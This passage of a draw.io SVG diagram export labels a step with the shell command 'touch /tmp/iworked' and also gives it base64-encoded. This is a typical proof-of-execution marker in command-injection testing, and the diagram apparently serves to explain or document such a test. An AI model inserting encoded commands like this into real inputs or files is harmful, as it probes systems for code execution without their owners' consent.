font-family="Helvetica" font-size="14px">dG91Y2ggL3RtcC9pd29ya2VkCg==</text></switch></g><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 132px; height: 1px; padding-top: 355px; margin-left: 372px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: none; white-space: normal; overflow-wrap: normal;">touch /tmp/iworked</div></div></div></foreignObject><text x="372" y="369" fill="#000000" font-family="Helvetica" font-size="14px">touch /tmp/iworked</text></switch></g></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a transform="translate(0,-5)" xlink:href="https://www.diagrams.net/doc/faq/svg-export-text-problems" target="_blank"><text text-anchor="middle" font-size="10px" x="50%" y="100%">Viewer does not support full SVG 1.1</text></a></switch></svg>